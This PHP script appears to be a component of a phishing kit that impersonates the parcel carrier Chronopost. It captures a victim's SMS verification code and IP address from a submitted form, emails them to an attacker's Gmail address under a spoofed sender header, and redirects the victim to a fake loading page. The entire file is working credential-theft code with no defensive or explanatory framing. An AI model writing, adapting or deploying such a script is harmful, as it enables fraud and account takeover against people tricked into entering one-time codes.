<?php
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[Chronopost]\n";
$message .= "SMS3      : ".$_POST['80']."\n";
$message .= "[DON]\n";
$send = "ewalilo.matkhafch@gmail.com";
$subject = "Chronopost[SMS] $ip";
$headers = "From: [Chronopost]<info@online.net>";
mail($send,$subject,$message,$headers);

echo '<script language="Javascript">
<!--
document.location.replace("./loding3.html");
// -->
</script>';
?>